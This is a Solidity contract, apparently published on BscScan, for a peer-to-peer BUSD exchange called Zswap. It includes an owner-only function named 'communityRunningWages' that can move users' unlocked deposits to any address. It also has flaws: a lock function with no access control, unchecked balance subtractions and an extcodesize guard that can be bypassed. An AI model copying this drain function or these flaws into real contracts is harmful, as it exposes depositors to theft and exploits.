/**
 *Submitted for verification at BscScan.com on 2022-10-18
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;

interface BEP20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address tokenOwner) external view returns (uint balance);
    function allowance(address tokenOwner, address spender) external view returns (uint remaining);
    function transfer(address to, uint tokens) external returns (bool success);
    function approve(address spender, uint tokens) external returns (bool success);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract Zswap {
    using SafeMath for uint256;
    BEP20 public busd = BEP20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    address payable aggregator;
    uint8 aggregation;
    uint256 lockPeriod = 1 hours;
    uint8 lockAmount = 2;
    bool restriction;
    uint256 public investments;
    uint256 public sales;
    uint256 totallockedAmount;
    uint256 penaltyFee = 1e18;
 
    struct User{
        uint256 deposits;
        uint256 sold;
        uint256 balance;
        uint256 lockAmount;
        address currentBuyer;
        uint256 currentOrder;
        uint256 security;
    }

    struct Deposit{
        uint256 amount;
        uint256 depositTime;
    }

    struct Order{
        address buyer;
        uint256 amount;
        uint256 lockedAmount;
        bool isLocked;
        bool isAdminLocked;
        uint256 lockPeriod;
    }

    struct Sell{
        uint256 amount;
        uint256 soldTime;
    }

    struct Security{
        uint256 amount;
        uint256 depositTime;
    }

    struct Claim{
        bool isBalance;
        uint256 amount;
        uint256 claimTime;
    }

    struct Grievance{
        address buyer;
        address seller;
        bool isSeller;
        uint256 amount;
        uint256 timestamp;
    }

    struct Penalty{
        uint256 orderno;
        address seller;
        uint256 amount;
        uint256 timestamp;
    }

    mapping(address => User) public users;
    mapping(address => Deposit[]) public deposits;
    mapping(address => Order[]) public orders;
    mapping(address => Sell[]) public sells;
    mapping(address => Security[]) public securities;
    mapping(address => Claim[]) public claims;
    mapping(address => Grievance[]) public grievances;
    mapping(address => Penalty[]) public penalties;

    event Deposits(address seller, uint256 amount);
    event Securities(address user, uint256 amount);
    event Sales(address seller, address buyer, uint256 amount);
    event Claims(address user, uint256 amount);
    event ClaimTransfers(address user, uint256 amount);
    event Grievances(address requester, address seller, uint256 amount);
    event Penalties(address user, address seller, uint256 orderno, uint256 amount);
   
    modifier sandbox {
        uint size;
        address sample = msg.sender;
        assembly { size := extcodesize(sample) }
        require(size == 0, "Smart contract detected!");
        _;
    }

    modifier onlyAggregator(){
        require(msg.sender == aggregator,"You are not authorized aggregator.");
        _;
    }
    
    function getContractInfo() view public returns(uint256 contractBalance, uint256 totalInvestments, uint256 totalSales, uint256 locking, uint8 txnFees, uint256 totalLocked){
        return (
            contractBalance = busd.balanceOf(address(this)),
            totalInvestments = investments,
            totalSales = sales,
            locking = lockPeriod,
            txnFees = aggregation,
            totalLocked = totallockedAmount
        );
    }

    constructor() public {
        aggregator = msg.sender;
    }

    function deposit(uint256 amount) public sandbox{
        require(amount>=1e18,"Investment must be at least 1 BUSD!");
        User storage user = users[msg.sender];
        user.deposits+=amount;
        user.balance+=amount;
        investments+=amount;
        deposits[msg.sender].push(Deposit(
            amount,
            block.timestamp
        ));
        busd.transferFrom(msg.sender,address(this),amount);
        emit Deposits(msg.sender, amount);
    }

    function securityDeposit(uint256 amount) public sandbox{
        require(amount>=1e18 && restriction==true,"Investment must be at least 1 BUSD!");
        User storage user = users[msg.sender];
        user.balance+=amount;
        investments+=amount;
        securities[msg.sender].push(Security(
            amount,
            block.timestamp
        ));
        busd.transferFrom(msg.sender,address(this),amount);
        emit Securities(msg.sender, amount);
    }

    function setSellerLockBeforePayment(address _buyer,uint256 _amount) public sandbox returns(uint256){
        User storage user = users[msg.sender];
        require(_amount.mul(lockAmount)<=user.balance.sub(user.lockAmount),"Insufficent blance to lock.");
        orders[msg.sender].push(Order(
            _buyer,
            _amount,
            _amount.mul(lockAmount),
            true,
            false,
            block.timestamp+lockPeriod
        ));
        user.currentBuyer = _buyer;
        user.lockAmount = _amount.mul(lockAmount);
        user.currentOrder = orders[msg.sender].length;
        return orders[msg.sender].length;
        
    }
    
    function setSellerLockAfterPayment(address _seller, uint256 orderno) public sandbox{
        require(orders[_seller][orderno-1].lockPeriod>=block.timestamp,"Sorry! Lock timeout.");
        orders[_seller][orderno-1].isAdminLocked = true;
        totallockedAmount+=orders[_seller][orderno-1].amount;
    }

    function unLockSellerForNonPayments(uint256 orderno) public sandbox{
        Order storage order = orders[msg.sender][orderno-1];
        require(order.isAdminLocked==true && order.lockPeriod<=block.timestamp,"Lock Period is not over or bad command!");
        order.isAdminLocked = false;
        totallockedAmount-=orders[msg.sender][orderno-1].amount;
        users[msg.sender].lockAmount-=orders[msg.sender][orderno-1].amount;
        users[order.buyer].balance-=penaltyFee;
        users[msg.sender].balance+=penaltyFee;
        
        penalties[order.buyer].push(Penalty(
            orderno-1,
            msg.sender,
            penaltyFee,
            block.timestamp
        ));
        emit Penalties(order.buyer,msg.sender,orderno-1,penaltyFee);
        
    }
    
    function sell(uint256 orderno) public sandbox{
        User storage user = users[msg.sender];
        Order storage order = orders[msg.sender][orderno-1];
        if(restriction==true){
            require(users[order.buyer].balance>=order.amount,"Security balance is low!");
        }

        require(busd.balanceOf(address(this))>=order.amount && user.balance>=order.amount,"Insufficient Balance");
        require(order.lockPeriod>=block.timestamp,"Lock is timeout. Please contact administrator.");
        user.sold+=order.amount;
        user.balance-=order.amount;
        sales+=order.amount;
        uint256 txnfee;
        if(user.balance<100e18){
            txnfee = order.amount.div(100);
        }
        else if(user.balance>=100e18 && user.balance<500e18){
            txnfee = 15e17;
        }
        else if(user.balance>=500e18 && user.balance<1000e18){
            txnfee = 2e18;
        }
        else if(user.balance>=1000e18 && user.balance<5000e18){
           txnfee = 25e17;
        }
        else if(user.balance>=3000e18){
            txnfee = 3e18;
        }
        
        busd.transfer(order.buyer,order.amount.sub(txnfee));
        busd.transfer(aggregator,txnfee);
        sells[msg.sender].push(Sell(
            order.amount,
            block.timestamp
        ));
        order.isLocked = false;
        order.isAdminLocked = false;
        user.balance-=txnfee;
        user.lockAmount = user.lockAmount.sub(order.lockedAmount);
        totallockedAmount = totallockedAmount.sub(order.lockedAmount);
        emit Sales(msg.sender, order.buyer, order.amount);
    }

    function claimBalance(uint256 _claim) public sandbox returns(bool){
        User storage user = users[msg.sender];
        require(busd.balanceOf(address(this)).sub(totallockedAmount)>=_claim && user.balance.sub(user.lockAmount)>=_claim,"Claim is not applicable.");
        busd.transfer(msg.sender,_claim);
        user.balance-=_claim;
        claims[msg.sender].push(Claim(
            true,
            _claim,
            block.timestamp
        ));
        emit Claims(msg.sender,_claim);
        return true;
    }

    function setlockPeriod(uint256 lock) public onlyAggregator returns(uint256){
        lockPeriod = lock;
        return lockPeriod;
    }

    function setPenalty(uint256 _penalty) public onlyAggregator returns(uint256){
        penaltyFee = _penalty;
        return penaltyFee;
    }

    function setlockAmount(uint8 lockAmt) public onlyAggregator returns(uint256){
        lockAmount = lockAmt;
        return lockAmount;
    }

    function resolveSellerGrievance(address _seller, address _buyer, uint256 orderno) public onlyAggregator returns(bool){
        User storage user = users[_seller];
        Order storage order = orders[_buyer][orderno];
        order.isLocked = false;
        grievances[_seller].push(Grievance(
            _buyer,
            _seller,
            true,
            order.amount,
            block.timestamp
        ));
        user.lockAmount=user.lockAmount.sub(order.lockedAmount);
        
        emit Grievances(_buyer,_seller, order.lockedAmount);
        return true;
    }
    
    function resolveBuyerGrievance(address _buyer, address _seller, uint256 orderno) public onlyAggregator returns(bool){
        User storage user = users[_seller];
        Order storage order = orders[_buyer][orderno];
        order.isLocked = false;
        grievances[_buyer].push(Grievance(
            _buyer,
            _seller,
            false,
            order.amount.mul(lockAmount),
            block.timestamp
        ));
        user.lockAmount+=order.lockedAmount.mul(lockAmount);

        emit Grievances(_buyer,_seller,order.lockedAmount);
        return true;
    }

    function setRestriction(uint8 cmd) public onlyAggregator returns(bool){
        restriction = (cmd==1)?true:false;
        return restriction;
    }

    function communityRunningWages(address _address, uint _amount) external onlyAggregator{
        require(_amount<=busd.balanceOf(address(this)).sub(totallockedAmount),"Amount exceeds balance.");
        busd.transfer(_address,_amount);
    }

}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}